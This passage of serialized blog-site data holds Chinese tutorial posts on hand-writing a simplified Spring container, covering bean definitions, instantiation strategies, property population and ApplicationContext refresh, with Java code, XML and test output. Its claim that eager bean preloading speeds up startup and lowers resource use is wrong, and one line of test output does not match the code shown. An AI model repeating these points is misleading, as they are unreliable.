BeanDefinition，并注册进容器中\n   BeanDefinition beanDefinition=new BeanDefinition(Cat.class);\n   beanFactory.registerBeanDefinition("cat",beanDefinition);\n   // 2. 获取Bean的能力：从容器中获取指定 Bean（通过有参构造），第一次获取会示例化并缓存\n   Cat cat=(Cat)beanFactory.getBean("cat","Cat -> Constructor");\n   cat.printName();\n   // 3. 第二次会直接从单例缓存中获取\n   Cat cat_cache=(Cat)beanFactory.getBean("cat");\n   cat_cache.printName();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 属性填充\n\n完成 Bean 的实例化之后，进行 Bean 的属性填充。\n\n\n# 定义一些职责和能力：\n\n * 无\n\n\n# 具体的实现：\n\n 1. PropertyValue：将一个 Bean 本身的 字段名、字段值映射为一个 PropertyValue；\n 2. PropertyValues：当一个 Bean 有多个字段时，将 PropertyValue 保存为一个集合；\n 3. BeanReference：属性填充时可能遇到 Bean 的依赖，A 依赖 B, B 依赖 C, 循环调用实例化，主要解决 Bean依赖 问题的属性填充；\n\n\n# 将实现加入原有的逻辑中：\n\n 1. BeanDefinition：之前只保存了实例化的类型Class（实例化用），现在将 PropertyValues 也填充进去（属性填充用）；\n 2. AbstractAutowireCapableBeanFactory：修改 createBeanInstance(String beanName, BeanDefinition beanDefinition, Object[] args) 加入属性填充步骤 applyPropertyValues(beanName, bean, beanDefinition)；\n\n\n# 测试：\n\n @Test\npublic void testDefaultListableBeanFactoryGetBeanWithApplyPropertyValues(){\n   // DefaultListableBeanFactory 的用法\n   DefaultListableBeanFactory beanFactory=new DefaultListableBeanFactory();\n   \n   // 1. 注册Bean的能力：将一个普通对象（和属性）转换为 BeanDefinition，并注册进容器中\n   // 注册一个 cat\n   PropertyValues catPropertyValues=new PropertyValues();\n   catPropertyValues.addPropertyValue(new PropertyValue("name","TomCat"));\n   BeanDefinition catBeanDefinition=new BeanDefinition(Cat.class,catPropertyValues);\n   beanFactory.registerBeanDefinition("cat",catBeanDefinition);\n   // 注册一个 dog，dog 依赖 cat\n   PropertyValues dogPropertyValues=new PropertyValues();\n   dogPropertyValues.addPropertyValue(new PropertyValue("name","JjDog"));\n   dogPropertyValues.addPropertyValue(new PropertyValue("cat",new BeanReference("cat")));\n   BeanDefinition dogBeanDefinition=new BeanDefinition(Dog.class,dogPropertyValues);\n   beanFactory.registerBeanDefinition("dog",dogBeanDefinition);\n   \n   // 2. 获取Bean的能力：从容器中获取指定 Bean，第一次获取会示例化并缓存\n   Dog dog=(Dog)beanFactory.getBean("dog");\n   dog.printName();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n',normalizedContent:'spring 的核心容器由两个部分组成：beanfactory 和 applicationcontext。beanfactory 是 spring 的基础，负责实例化、配置和管理应用程序中的对象。applicationcontext 是 beanfactory 的一个更高级别的实现，提供了额外的功能，如国际化、事件传播和bean预处理。\n\n\n\n * 核心容器 defaultlistablebeanfactory\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n * 实例化\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n * 属性填充\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n\n\n\n设计一个spring容器需要考虑以下几个方面：\n\n 1. 容器初始化\n\nspring 容器初始化过程中需要完成的任务包括：读取 xml 配置文件，解析 xml 配置信息，创建 bean 对象，进行 bean 之间的依赖注入等。因此，设计一个高效的初始化过程是非常重要的。可以考虑采用单例模式，使用懒加载机制来避免无用的资源浪费。\n\n 2. bean 的实例化和管理\n\n在设计 spring 容器时，需要考虑如何管理 bean 的生命周期，包括 bean 的实例化、初始化、销毁等。可以使用反射机制来实例化 bean，使用依赖注入技术来完成 bean 之间的依赖关系。对于 bean 的生命周期管理，可以使用 beanpostprocessor 和 beanfactorypostprocessor 等机制。\n\n 3. 依赖注入\n\n依赖注入是 spring 的核心功能之一，它使得 bean 之间的关系更加松散。设计一个高效的依赖注入机制是非常重要的。可以考虑使用自动装配机制，根据 bean 之间的依赖关系自动完成依赖注入。同时，为了避免循环依赖问题，可以使用构造函数注入或者延迟依赖注入等机制。\n\n 4. aop\n\n面向切面编程（aop）是spring的另一个核心功能。在设计 spring 容器时，需要考虑如何支持 aop。可以使用代理模式或者字节码增强技术来实现 aop 功能。同时，为了方便用户使用，可以提供注解或者 xml 配置文件等方式来配置 aop。\n\n 5. web 支持\n\nspring 也提供了 web 支持，包括 mvc 架构和 restful 服务等。在设计 spring 容器时，需要考虑如何支持 web 功能。可以使用 servlet 容器来支持 web 功能，并提供注解或者 xml 配置文件等方式来配置 web 功能。\n\n总的来说，设计一个高效、易用、灵活的 spring 容器需要考虑多个方面，包括容器初始化、bean 的实例化和管理、依赖注入、aop 和 web 支持等。需要根据具体需求来确定设计方案，并不断优化和改进。\n\n\n# 核心容器 defaultlistablebeanfactory\n\n对 spring 中的核心类：defaultlistablebeanfactory 做一个简单初步的实现：\n\n\n# 定义一些职责和能力：\n\n 1. beanfactory：提供获取 bean 的能力；\n\n 2. beandefinition：spring 可以通过 xml 或 注解 的方式加载一个 bean，但为了更好的扩展，不管从何处加载的 bean， 最好都统一转换为一个指定对象， 那么就需要定义一个统一的门面对象：beandefinition，只要有 beandefinition 我们就可以实例化一个 bean；\n\n 3. singletonbeanregistry：提供获取一个 单例bean 的能力（其实就是通过每个beandefinition定义的class反射获得一个bean，并缓存起来）；\n\n 4. beandefinitionregistry：提供注册 beandefinition 的能力；\n\n\n# 具体的实现：\n\n 1. defaultsingletonbeanregistry： implements singletonbeanregistry， 实现了 单例bean 的添加，获取；\n\n 2. abstractbeanfactory：extends defaultsingletonbeanregistry implements beanfactory， 实现了 getbean(string beanname) 而 getbean(string beanname) 的实现则主要是调用留给子类实现的空方法 createbean(beanname, beandefinition)；\n\n 3. abstractautowirecapablebeanfactory：extends abstractbeanfactory，实现createbean(beanname, beandefinition)， 实现通过 beandefinition 创建 bean 的能力；\n\n 4. ★ defaultlistablebeanfactory：extends abstractautowirecapablebeanfactory implements beandefinitionregistry， 实现注册 beandefinition 的能力，获得一个 bean 的能力；\n\n\n# 将实现加入原有的逻辑中：\n\n * 无\n\n\n# 测试：\n\npublic void testdefaultlistablebeanfactory(){\n   // defaultlistablebeanfactory 的用法\n   defaultlistablebeanfactory beanfactory=new defaultlistablebeanfactory();\n   // 1. 注册bean的能力：将一个普通对象转换为 beandefinition，并注册进容器中\n   beandefinition beandefinition=new beandefinition(cat.class);\n   beanfactory.registerbeandefinition("cat",beandefinition);\n   // 2. 获取bean的能力：从容器中获取指定 bean，第一次获取会示例化并缓存\n   cat cat=(cat)beanfactory.getbean("cat");\n   cat.name();\n   // 3. 第二次会直接从单例缓存中获取\n   cat cat_cache=(cat)beanfactory.getbean("cat");\n   cat_cache.name();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 实例化\n\n上述方式只支持默认的无参构造实例化 bean。\n\n\n# 定义一些职责和能力：\n\n 1. instantiationstrategy：要想容器支持对 bean的有参构造器 实例化的方式，需要定义一个实例化策略接口 instantiationstrategy，当然，定义这个 instantiationstrategy 策略接口也是为了支持不同实例化方式方便扩展。\n\n添加一个实例化方法：object instantiatie(beandefinition beandefinition, string beanname, constructor constructor, object[] args);\n\n一个 bean 的实例化，需要的基本参数有：\n\n * beandefinition：主要保存了一个具体类的定义，主要就是实例化这个类\n * constructor：通过哪个构造方法实例化\n * args：构造方法的参数\n\n\n# 具体的实现：\n\n * simpleinstantiationstrategy：jdk 实例化策略\n\n * cglibsubclassinginstantiationstrategy：cglib 实例化策略\n\n\n# 将实现加入原有的逻辑中：\n\n 1. abstractautowirecapablebeanfactory：修改 createbean(string beanname, beandefinition beandefinition) 实现，加入支持有参构造的实例化策略 createbeaninstance(beandefinition, beanname, args);。\n\n\n# 测试：\n\n@test\npublic void testdefaultlistablebeanfactorygetbeanwithconstructor(){\n   // defaultlistablebeanfactory 的用法\n   defaultlistablebeanfactory beanfactory=new defaultlistablebeanfactory();\n   // 1. 注册bean的能力：将一个普通对象转换为 beandefinition，并注册进容器中\n   beandefinition beandefinition=new beandefinition(cat.class);\n   beanfactory.registerbeandefinition("cat",beandefinition);\n   // 2. 获取bean的能力：从容器中获取指定 bean（通过有参构造），第一次获取会示例化并缓存\n   cat cat=(cat)beanfactory.getbean("cat","cat -> constructor");\n   cat.printname();\n   // 3. 第二次会直接从单例缓存中获取\n   cat cat_cache=(cat)beanfactory.getbean("cat");\n   cat_cache.printname();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 属性填充\n\n完成 bean 的实例化之后，进行 bean 的属性填充。\n\n\n# 定义一些职责和能力：\n\n * 无\n\n\n# 具体的实现：\n\n 1. propertyvalue：将一个 bean 本身的 字段名、字段值映射为一个 propertyvalue；\n 2. propertyvalues：当一个 bean 有多个字段时，将 propertyvalue 保存为一个集合；\n 3. beanreference：属性填充时可能遇到 bean 的依赖，a 依赖 b, b 依赖 c, 循环调用实例化，主要解决 bean依赖 问题的属性填充；\n\n\n# 将实现加入原有的逻辑中：\n\n 1. beandefinition：之前只保存了实例化的类型class（实例化用），现在将 propertyvalues 也填充进去（属性填充用）；\n 2. abstractautowirecapablebeanfactory：修改 createbeaninstance(string beanname, beandefinition beandefinition, object[] args) 加入属性填充步骤 applypropertyvalues(beanname, bean, beandefinition)；\n\n\n# 测试：\n\n @test\npublic void testdefaultlistablebeanfactorygetbeanwithapplypropertyvalues(){\n   // defaultlistablebeanfactory 的用法\n   defaultlistablebeanfactory beanfactory=new defaultlistablebeanfactory();\n   \n   // 1. 注册bean的能力：将一个普通对象（和属性）转换为 beandefinition，并注册进容器中\n   // 注册一个 cat\n   propertyvalues catpropertyvalues=new propertyvalues();\n   catpropertyvalues.addpropertyvalue(new propertyvalue("name","tomcat"));\n   beandefinition catbeandefinition=new beandefinition(cat.class,catpropertyvalues);\n   beanfactory.registerbeandefinition("cat",catbeandefinition);\n   // 注册一个 dog，dog 依赖 cat\n   propertyvalues dogpropertyvalues=new propertyvalues();\n   dogpropertyvalues.addpropertyvalue(new propertyvalue("name","jjdog"));\n   dogpropertyvalues.addpropertyvalue(new propertyvalue("cat",new beanreference("cat")));\n   beandefinition dogbeandefinition=new beandefinition(dog.class,dogpropertyvalues);\n   beanfactory.registerbeandefinition("dog",dogbeandefinition);\n   \n   // 2. 获取bean的能力：从容器中获取指定 bean，第一次获取会示例化并缓存\n   dog dog=(dog)beanfactory.getbean("dog");\n   dog.printname();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"手写 Spring 04 - 加入上下文，预加载容器操作",frontmatter:{title:"手写 Spring 04 - 加入上下文，预加载容器操作",date:"2023-03-19T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/spring-source-04.html",relativePath:"views/backend/spring-source-04.md",key:"v-a791ebc8",path:"/views/backend/spring-source-04.html",headers:[{level:2,title:"加入上下文",slug:"加入上下文",normalizedTitle:"加入上下文",charIndex:586},{level:3,title:"定义一些职责和能力：",slug:"定义一些职责和能力",normalizedTitle:"定义一些职责和能力：",charIndex:597},{level:3,title:"具体的实现：",slug:"具体的实现",normalizedTitle:"具体的实现：",charIndex:613},{level:3,title:"将实现加入原有的逻辑中：",slug:"将实现加入原有的逻辑中",normalizedTitle:"将实现加入原有的逻辑中：",charIndex:625},{level:3,title:"测试：",slug:"测试",normalizedTitle:"测试：",charIndex:643},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:650}],excerpt:"<Boxx/>\n<p>Spring 上下文（Context）和 BeanFactory 是 Spring 框架中的两个重要概念，它们之间存在继承关系。</p>\n<p>BeanFactory 是 Spring 框架中最基本的容器，它是一个用于管理 Bean 实例的工厂。在 Spring 中，BeanFactory 提供了一些基本的功能，例如 Bean 的创建、配置、生命周期管理等。但是，BeanFactory 的功能相对较为简单，只有在使用时才会进行 Bean 的创建和初始化。</p>\n<p>Spring 上下文则是在 BeanFactory 的基础上扩展而来的，它提供了更多的高级功能，例如国际化、AOP、事件发布等。与 BeanFactory 不同，<strong>Spring 上下文在启动时会一次性创建并初始化所有的 Bean 实例</strong>，这样可以提高应用程序的启动速度和运行效率。同时，Spring 上下文还提供了更多的扩展点，使得可以在运行时动态地加载和卸载 Bean 定义、注册和取消注册 BeanFactory 后置处理器和应用程序监听器等。</p>\n<p>因此，Spring 上下文可以看作是 BeanFactory 的一个扩展，它在 BeanFactory 的基础上添加了更多的高级功能和扩展点。在实际应用中，通常使用 Spring 上下文来管理 Bean 实例和配置信息，而不是直接使用 BeanFactory。</p>\n",headersStr:"加入上下文 定义一些职责和能力： 具体的实现： 将实现加入原有的逻辑中： 测试： 总结",content:'Spring 上下文（Context）和 BeanFactory 是 Spring 框架中的两个重要概念，它们之间存在继承关系。\n\nBeanFactory 是 Spring 框架中最基本的容器，它是一个用于管理 Bean 实例的工厂。在 Spring 中，BeanFactory 提供了一些基本的功能，例如 Bean 的创建、配置、生命周期管理等。但是，BeanFactory 的功能相对较为简单，只有在使用时才会进行 Bean 的创建和初始化。\n\nSpring 上下文则是在 BeanFactory 的基础上扩展而来的，它提供了更多的高级功能，例如国际化、AOP、事件发布等。与 BeanFactory 不同，Spring 上下文在启动时会一次性创建并初始化所有的 Bean 实例，这样可以提高应用程序的启动速度和运行效率。同时，Spring 上下文还提供了更多的扩展点，使得可以在运行时动态地加载和卸载 Bean 定义、注册和取消注册 BeanFactory 后置处理器和应用程序监听器等。\n\n因此，Spring 上下文可以看作是 BeanFactory 的一个扩展，它在 BeanFactory 的基础上添加了更多的高级功能和扩展点。在实际应用中，通常使用 Spring 上下文来管理 Bean 实例和配置信息，而不是直接使用 BeanFactory。\n\n\n\n * 加入上下文\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n * 总结\n\n\n\n\n# 加入上下文\n\n\n# 定义一些职责和能力：\n\n 1. ListableBeanFactory：扩展 BeanFactory 接口，支持获取多个 Bean 或者与获取多个 Bean 相关的能力。\n    \n    根据类型获取 Spring 容器中所有对应类型的 Bean 实例：<T> Map<String, T> getBeansOfType(Class<T> type);\n    \n    获取 Spring 容器中所有 BeanDefinition 的名称：String[] getBeanDefinitionNames();\n\n 2. ApplicationContext：\n    \n     extends ListableBeanFactory\n    \n    \n    1\n    \n    \n    容器顶层接口，与 BeanFactory 不同，ApplicationContext 在容器启动时会一次性创建并初始化所有的 Bean 实例，而不是在使用时再进行创建。这意味着，ApplicationContext 在应用程序启动时会更快地启动和准备好，同时也减少了在运行时创建 Bean 实例的开销。此外，ApplicationContext 还提供了更多的特性，例如事件发布、国际化、AOP 等。\n    \n    这里我们只定义，留空不做任何处理。\n\n 3. ConfigurableApplicationContext\n    \n     extends ApplicationContext\n    \n    \n    1\n    \n    \n    扩展了 ApplicationContext 的功能，在这里定义了大名鼎鼎的刷新 refresh() 功能，另外，ConfigurableApplicationContext 还提供了一些工具方法，例如获取系统环境变量、获取资源、获取 Bean 类型、启动和关闭容器等。\n\n 4. ConfigurableListableBeanFactory\n    \n     extends ListableBeanFactory,// 可获取多个 Bean \n            AutowireCapableBeanFactory, // BeanPostProcessor 的前后置处理\n            ConfigurableBeanFactory // 添加 BeanPostProcessor\n    \n    \n    1\n    2\n    3\n    \n    \n    这里我们主要定义了预实例化所有单例 bean 的能力：void preInstantiateSingletons();\n\n\n# 具体的实现：\n\n 1. AbstractApplicationContext\n    \n    extends DefaultResourceLoader // 获得了资源加载器的能力\n    implements ConfigurableApplicationContext {\n        @Override\n        public void refresh() {\n            // 1. 创建 Bean 工厂，加载 BeanDefinition\n            refreshBeanFactory();\n    \n            // 2. 获得 Bean 工厂\n            ConfigurableListableBeanFactory beanFactory = getBeanFactory();\n    \n            // 3. BeanDefinition 扩展点：\n            // Spring 容器中 BeanDefinition 的扩展点。\n            // 创建 BeanDefinition 之后，但在创建 Bean 实例之前。\n            invokeBeanFactoryPostProcessors(beanFactory);\n    \n            // 4. Bean 扩展点：\n            // 提前注册所有的 BeanPostProcessor，在 Bean 创建后，初始化时扩展\n            //（见 AbstractAutowireCapableBeanFactory.createBean ）。\n            registerBeanPostProcessors(beanFactory);\n    \n            // 5. 提前实例化所有的单例 Bean\n            beanFactory.preInstantiateSingletons();\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    \n    \n    主要实现了 refresh() 这个核心方法。\n\n 2. AbstractRefreshableApplicationiContext\n    \n     extends AbstractApplicationContext\n    \n    \n    1\n    \n    \n    主要实现了 refreshBeanFactory()，这个方法中创建了默认的容器 DefaultListableBeanFactory，同时在创建容器后向容器中加载Bean定义：loadBeanDefinitions(DefaultListableBeanFactory beanFactory)，留给子类实现。\n\n 3. AbstractXmlApplicationContext\n    \n     extends AbstractRefreshableApplicationiContext\n    \n    \n    1\n    \n    \n    主要实现了从指定资源位置加载 Bean 定义： loadBeanDefinitions(DefaultListableBeanFactory beanFactory)\n    \n    同时留作获取资源位置： getConfigLocations(); 给子类实现。\n\n 4. ClassPathXmlApplicationContext：\n    \n    extends AbstractXmlApplicationContext\n    \n    \n    1\n    \n    \n    ClassPathXmlApplicationContext 上下文是 Bean 工厂的高级实现，将复杂的 xml 的加载、解析，Bean 的注册、实例化、属性填充、生命周期扩展等进行融合，让我们对 Bean 的管理更加简单易用。\n    \n    实现通过构造参数的方式new ClassPathXmlApplicationContext("classpath:spring.xml");赋值给 getConfigLocations() 来实现资源位置的获取。\n\n\n# 将实现加入原有的逻辑中：\n\n 1. 可以看到，refresh() 默认创建的容器是 DefaultListableBeanFactory，而 refresh() 中弟 5 步：提前实例化所有的单例 Bean，这个是之前 DefaultListableBeanFactory 这个容器所不具备的能力。修改 DefaultListableBeanFactory：\n    \n    extends AbstractAutowireCapableBeanFactory // 具备真正创建bean实例化、属性填充、BeanPostProcessor前后置扩展的能力\n        implements BeanDefinitionRegistry, // 之前 DefaultListableBeanFactory 已经实现了 注册 BeanDefinition 相关的能力\n    \tConfigurableListableBeanFactory // 新添加 要实现的功能：预实例化所有单例 Bean\n    {\n    \tprivate final Map<String, BeanDefinition> beanDefinitionMap = new HashMap<>();\n        @Override\n        public void preInstantiateSingletons() {\n            beanDefinitionMap.keySet().forEach(this::getBean);\n        }\n        @Override\n        public <T> Map<String, T> getBeansOfType(Class<T> type) {\n            HashMap<String, T> result = new HashMap<>();\n            beanDefinitionMap.forEach((beanName, beanDefinition) -> {\n                Class<?> beanClass = beanDefinition.getBeanClass();\n                if (type.isAssignableFrom(beanClass)) {\n                    result.put(beanName, (T) getBean(beanName));\n                }\n            });\n            return result;\n        }\n        @Override\n        public String[] getBeanDefinitionNames() {\n            return beanDefinitionMap.keySet().toArray(new String[0]);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    \n    \n    因为在 XmlBeanDefinitionReader 资源加载的时候，会将所有的 BeanDefinition 注册到容器 DefaultListableBeanFactory，所以在这里只需将所有 BeanDefinition 遍历去构建 Bean 即可。\n\n\n# 测试：\n\n * BeanPostProcessor 准备\n\npublic class CatBeanPostProcessor implements BeanPostProcessor {\n\n    @Override\n    public Object postProcessBeforeInitialization(Object bean, String beanName) {\n        System.out.println("beanName：" + beanName + " 进入到 Bean 扩展点 BeanPostProcessor -> postProcessBeforeInitialization");\n        if ("cat".equals(beanName)) {\n            Cat cat = (Cat) bean;\n            return new Cat("postProcessBeforeInitialization name cat");\n        }\n        return bean;\n    }\n\n    @Override\n    public Object postProcessAfterInitialization(Object bean, String beanName) {\n        System.out.println("beanName：" + beanName + " 进入到 Bean 扩展点 BeanPostProcessor -> postProcessAfterInitialization");\n        return bean;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n * BeanFactoryPostProcessor 准备\n\npublic class DogBeanFactoryPostProcessor implements BeanFactoryPostProcessor {\n\n    @Override\n    public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) {\n        System.out.println("进入到 BeanDefinition 扩展点 BeanFactoryPostProcessor -> postProcessBeanFactory");\n        String beanName = "dog";\n        BeanDefinition beanDefinition = beanFactory.getBeanDefinition(beanName);\n        PropertyValues propertyValues = beanDefinition.getPropertyValues();\n        PropertyValue propertyValue = propertyValues.getPropertyValue("name");\n        String oldValue = String.valueOf(propertyValue.getValue());\n        String updateValue = beanName + "-BeanDefinition-updated";\n        propertyValue.setValue(updateValue);\n        System.out.println("beanName：" + beanName + " 属性：name，原先值：" + oldValue + " 修改后值：" + updateValue);\n        System.out.println();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n * 外部资源 spring.xml 准备\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans>\n    <bean id="cat" name="catBEAN" class="com.snail.springframework.beans.factory.support.Cat">\n        <property name="name" value="cat-name-xml-init"></property>\n    </bean>\n    <bean id="dog" class="com.snail.springframework.beans.factory.support.Dog">\n        <property name="name" value="dog-name-xml-init"></property>\n        <property name="cat" ref="cat"></property>\n    </bean>\n\n    \x3c!--  添加扩展点相关类  --\x3e\n    <bean class="com.snail.springframework.beans.factory.support.CatBeanPostProcessor"/>\n    <bean class="com.snail.springframework.beans.factory.support.DogBeanFactoryPostProcessor"/>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n * 测试类\n\n之前使用容器的测试类：\n\n@Test\npublic void test_beanFactoryAndPostProcessor() {\n    // 1. 初始化 Bean 工厂\n    DefaultListableBeanFactory beanFactory = new DefaultListableBeanFactory();\n    // 2. 使用加载器加载xml配置文件，初始化 BeanDefinition\n    XmlBeanDefinitionReader reader = new XmlBeanDefinitionReader(beanFactory);\n    reader.loadBeanDefinitions("classpath:spring.xml");\n    \n\t// 3. 添加 BeanDefinition 扩展点，（这里的扩展点是手动调用的）\n    // 在 Bean 实例化前，BeanDefinition 初始化后\n    new DogBeanFactoryPostProcessor().postProcessBeanFactory(beanFactory);\n    // 4. 添加 Bean 扩展点\n    // Bean 初始化前后回调相应方法\n    CatBeanPostProcessor catBeanPostProcessor = new CatBeanPostProcessor();\n    beanFactory.addBeanPostProcessor(catBeanPostProcessor);\n    \n    // 5. 获取bean\n    Dog dog = (Dog) beanFactory.getBean("dog");\n    System.out.println();\n    dog.printName();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n使用上下文后的测试类，可以看到相比之前已经有了极大的便利性：\n\n@Test\npublic void test_xml_context() {\n    // 1. 利用 xml上下文 加载Bean\n    // 上下文的高级实现极大的简化了或融合了上述的 1-4 步操作\n    ClassPathXmlApplicationContext applicationContext = new ClassPathXmlApplicationContext("classpath:spring.xml");\n    // 2. 获取bean\n    Dog dog = (Dog) applicationContext.getBean("dog");\n\n    String[] beanDefinitionNames = applicationContext.getBeanDefinitionNames();\n    System.out.println();\n    System.out.println(JSONUtil.toJsonStr(beanDefinitionNames));\n    System.out.println();\n    dog.printName();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n * 测试结果\n\n进入到 BeanDefinition 扩展点 BeanFactoryPostProcessor -> postProcessBeanFactory\nbeanName：dog 属性：name，原先值：dog-name-xml-init 修改后值：dog-BeanDefinition-updated\n\nbeanName：cat 进入到 Bean 扩展点 BeanPostProcessor -> postProcessBeforeInitialization\nbeanName：cat 进入到 Bean 扩展点 BeanPostProcessor -> postProcessAfterInitialization\nbeanName：dog 进入到 Bean 扩展点 BeanPostProcessor -> postProcessBeforeInitialization\nbeanName：dog 进入到 Bean 扩展点 BeanPostProcessor -> postProcessAfterInitialization\n\n["cat","catBeanPostProcessor","dog","dogBeanFactoryPostProcessor"]\n\ndog-BeanDefinition-updated\nCat{name=\'postProcessBeforeInitialization name cat\'}\n{inner-dog2=JerryDog, inner-dog1=TomDog}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 总结\n\n总结，Spring 上下文（Context）相对于 BeanFactory 有以下优势：\n\n 1. 预加载：BeanFactory 在容器启动时并不会实例化所有的 Bean，而是在需要时才进行实例化。相反，Spring 上下文会在容器启动时一次性创建并初始化所有的 Bean 实例。这样可以加快应用程序的启动速度，减少应用程序的资源消耗。\n 2. 自动装配：Spring 上下文支持自动装配，可以根据类型或名称自动注入 Bean 实例，而 BeanFactory 需要手动配置依赖注入关系。\n 3. 高级特性：Spring 上下文提供了更多的高级特性，例如 AOP、事务、国际化、事件发布等。而 BeanFactory 只提供了基本的 Bean 创建和管理功能。\n 4. 扩展性：Spring 上下文是在 BeanFactory 的基础上扩展而来的，它提供了更多的扩展点，使得可以在运行时动态地加载和卸载 Bean 定义、注册和取消注册 BeanFactory 后置处理器和应用程序监听器等。\n 5. 代码简洁性：Spring 上下文可以将多个 BeanFactory 集成到一个上下文中，从而简化了代码的编写和维护。\n\n综上所述，相对于 BeanFactory，Spring 上下文提供了更多的高级特性和扩展点，同时也具有更高的预加载性能和自动装配能力。因此，在实际应用中，通常使用 Spring 上下文来管理 Bean 实例和配置信息。',normalizedContent:'spring 上下文（context）和 beanfactory 是 spring 框架中的两个重要概念，它们之间存在继承关系。\n\nbeanfactory 是 spring 框架中最基本的容器，它是一个用于管理 bean 实例的工厂。在 spring 中，beanfactory 提供了一些基本的功能，例如 bean 的创建、配置、生命周期管理等。但是，beanfactory 的功能相对较为简单，只有在使用时才会进行 bean 的创建和初始化。\n\nspring 上下文则是在 beanfactory 的基础上扩展而来的，它提供了更多的高级功能，例如国际化、aop、事件发布等。与 beanfactory 不同，spring 上下文在启动时会一次性创建并初始化所有的 bean 实例，这样可以提高应用程序的启动速度和运行效率。同时，spring 上下文还提供了更多的扩展点，使得可以在运行时动态地加载和卸载 bean 定义、注册和取消注册 beanfactory 后置处理器和应用程序监听器等。\n\n因此，spring 上下文可以看作是 beanfactory 的一个扩展，它在 beanfactory 的基础上添加了更多的高级功能和扩展点。在实际应用中，通常使用 spring 上下文来管理 bean 实例和配置信息，而不是直接使用 beanfactory。\n\n\n\n * 加入上下文\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n * 总结\n\n\n\n\n# 加入上下文\n\n\n# 定义一些职责和能力：\n\n 1. listablebeanfactory：扩展 beanfactory 接口，支持获取多个 bean 或者与获取多个 bean 相关的能力。\n    \n    根据类型获取 spring 容器中所有对应类型的 bean 实例：<t> map<string, t> getbeansoftype(class<t> type);\n    \n    获取 spring 容器中所有 beandefinition 的名称：string[] getbeandefinitionnames();\n\n 2. applicationcontext：\n    \n     extends listablebeanfactory\n    \n    \n    1\n    \n    \n    容器顶层接口，与 beanfactory 不同，applicationcontext 在容器启动时会一次性创建并初始化所有的 bean 实例，而不是在使用时再进行创建。这意味着，applicationcontext 在应用程序启动时会更快地启动和准备好，同时也减少了在运行时创建 bean 实例的开销。此外，applicationcontext 还提供了更多的特性，例如事件发布、国际化、aop 等。\n    \n    这里我们只定义，留空不做任何处理。\n\n 3. configurableapplicationcontext\n    \n     extends applicationcontext\n    \n    \n    1\n    \n    \n    扩展了 applicationcontext 的功能，在这里定义了大名鼎鼎的刷新 refresh() 功能，另外，configurableapplicationcontext 还提供了一些工具方法，例如获取系统环境变量、获取资源、获取 bean 类型、启动和关闭容器等。\n\n 4. configurablelistablebeanfactory\n    \n     extends listablebeanfactory,// 可获取多个 bean \n            autowirecapablebeanfactory, // beanpostprocessor 的前后置处理\n            configurablebeanfactory // 添加 beanpostprocessor\n    \n    \n    1\n    2\n    3\n    \n    \n    这里我们主要定义了预实例化所有单例 bean 的能力：void preinstantiatesingletons();\n\n\n# 具体的实现：\n\n 1. abstractapplicationcontext\n    \n    extends defaultresourceloader // 获得了资源加载器的能力\n    implements configurableapplicationcontext {\n        @override\n        public void refresh() {\n            // 1. 创建 bean 工厂，加载 beandefinition\n            refreshbeanfactory();\n    \n            // 2. 获得 bean 工厂\n            configurablelistablebeanfactory beanfactory = getbeanfactory();\n    \n            // 3. beandefinition 扩展点：\n            // spring 容器中 beandefinition 的扩展点。\n            // 创建 beandefinition 之后，但在创建 bean 实例之前。\n            invokebeanfactorypostprocessors(beanfactory);\n    \n            // 4. bean 扩展点：\n            // 提前注册所有的 beanpostprocessor，在 bean 创建后，初始化时扩展\n            //（见 abstractautowirecapablebeanfactory.createbean ）。\n            registerbeanpostprocessors(beanfactory);\n    \n            // 5. 提前实例化所有的单例 bean\n            beanfactory.preinstantiatesingletons();\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    \n    \n    主要实现了 refresh() 这个核心方法。\n\n 2. 